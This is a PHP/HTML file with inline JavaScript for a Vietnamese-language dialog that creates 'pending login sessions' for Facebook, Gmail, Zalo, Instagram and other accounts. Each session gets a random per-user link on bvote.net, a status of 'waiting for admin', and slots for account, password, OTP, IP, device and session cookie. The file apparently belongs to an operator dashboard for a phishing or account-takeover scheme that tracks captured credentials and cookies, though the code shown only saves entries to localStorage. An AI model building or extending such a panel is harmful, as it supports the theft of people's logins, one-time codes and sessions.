<?php
// CreateLoginDialog.php - Chuyển đổi từ CreateLoginDialog.jsx
?>
<div id="create-login-dialog" style="display:none;">
  <div class="dialog-content sm:max-w-[425px] bg-gradient-to-tr from-[#020024] to-[#0c0c3a] border-purple-800 text-white">
    <div class="dialog-header">
      <div class="dialog-title text-cyan-300 flex items-center">
        <span class="mr-2 h-5 w-5">📄</span> Tạo Phiên Đăng Nhập Chờ
      </div>
      <div class="dialog-description text-gray-400">
        Tạo một phiên đăng nhập thủ công. Phiên này sẽ xuất hiện trong bảng và chờ được sử dụng.
      </div>
    </div>
    <form id="create-login-form" class="grid gap-4 py-4">
      <div class="grid grid-cols-4 items-center gap-4">
        <label for="platform" class="text-right text-gray-300">Nền tảng</label>
        <select id="platform" name="platform" class="col-span-3 bg-slate-800/80 border-slate-600">
          <option value="">Chọn nền tảng...</option>
          <option value="Facebook">Facebook</option>
          <option value="Gmail">Gmail</option>
          <option value="Zalo">Zalo</option>
          <option value="Instagram">Instagram</option>
          <option value="Hotmail">Hotmail</option>
          <option value="Yahoo">Yahoo</option>
          <option value="Khác">Khác</option>
        </select>
      </div>
      <div class="grid grid-cols-4 items-center gap-4">
        <label for="chrome-profile" class="text-right text-gray-300">Chrome Profile</label>
        <input type="text" id="chrome-profile" name="chrome-profile" class="col-span-3 bg-slate-800/80 border-slate-600" placeholder="Nhập tên profile..." />
      </div>
      <div class="grid grid-cols-4 items-center gap-4">
        <label for="link-name" class="text-right text-gray-300">Tên Link</label>
        <input type="text" id="link-name" name="link-name" class="col-span-3 bg-slate-800/80 border-slate-600" placeholder="Nhập tên link..." />
      </div>
      <div class="dialog-footer">
        <button type="submit" class="glowing-button-cyber">Tạo Phiên</button>
      </div>
    </form>
  </div>
</div>
<script>
document.getElementById('create-login-form').onsubmit = function(e) {
  e.preventDefault();
  var platform = document.getElementById('platform').value;
  var chromeProfile = document.getElementById('chrome-profile').value;
  var linkName = document.getElementById('link-name').value;
  if (!platform || !chromeProfile || !linkName) {
    alert('Vui lòng điền đầy đủ thông tin.');
    return;
  }
  // Tạo entry mới, lưu vào localStorage hoặc gửi lên server
  var newEntry = {
    id: 'manual-' + Date.now(),
    time: new Date().toISOString(),
    platform: platform,
    chrome: chromeProfile,
    linkName: linkName,
    userLink: 'https://bvote.net/user/' + Math.random().toString(36).substring(2, 10),
    status: '🟡 Chờ admin',
    account: 'N/A',
    password: 'N/A',
    otp: 'N/A',
    ip: 'N/A',
    device: 'N/A',
    cookie: 'Chờ...'
  };
  // Ví dụ lưu vào localStorage
  var entries = JSON.parse(localStorage.getItem('manualLoginEntries') || '[]');
  entries.push(newEntry);
  localStorage.setItem('manualLoginEntries', JSON.stringify(entries));
  alert('Đã tạo phiên đăng nhập chờ thành công!');
  document.getElementById('create-login-dialog').style.display = 'none';
  document.getElementById('platform').value = '';
  document.getElementById('chrome-profile').value = '';
  document.getElementById('link-name').value = '';
};
</script>
